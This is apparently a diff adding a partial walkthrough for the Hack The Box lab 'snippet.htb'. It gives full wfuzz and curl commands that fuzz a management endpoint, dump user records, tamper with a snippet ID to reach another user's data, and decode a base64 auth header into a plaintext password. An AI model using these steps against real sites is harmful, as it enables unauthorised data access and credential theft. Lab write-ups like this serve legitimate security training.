@@ -1,0 +1,31 @@
+Start with a nmap scan & fuzzing some subdomains
+Subdomains found:
+	mail.snippet.htb
+	dev.snippet.htb
+
+Viewing the html of the main website we found a script. Beautify it, save it and execute the following commnad.
+# cat ziggy.js | grep uri
+
+There's an endpoint "/management/dump".
+Some parameters are needed to complete the POST request, so it's time to fuzz them
+
+# wfuzz -d '{"FUZZ":"FUZZ"}' -u http://snippet.htb/management/dump -w /usr/share/wordlists/wfuzz/general/big.txt -H "Content-Type: application/json" -H "X-XSRF-TOKEN: x_xsrf_token" -H "Cookie: XSRF-TOKEN=xsrf_token; snippethtb_session=session_id" --hs "Missing"
+The tokens can be obtained doing a failed logging attempt
+
+The parameters are download & user and with that the http request can be done
+# curl -d '{"download":"users"}' http://snippet.htb/management/dump -H "Content-Type: application/json" -H "X-XSRF-TOKEN: x_xsrf_token" -H "Cookie: XSRF-TOKEN=xsrf_token; snippethtb_session=session_id" > users.json
+
+There are some users with the 'manager' type, don't waste time trying to crack them.
+However some users have hashes with the same password that can be cracked. Check the hash.txt file to view them.
+
+Log in to the main website with one of these users
+There is a field that can be tampered updating the 'new snippet'. Put 2 insted of other number and to the bottom of the html code
+there is a curl payload
+# GET /snippets/update/2
+payload:
+# curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens -H 'accept: application/json' -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'
+
+After decoding the authorization field you will find the user and password for jean user
+# echo 'amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB' | base64 -d
+jean : EHmfar1Y7ppA9O5TAIXnYnJpA
+
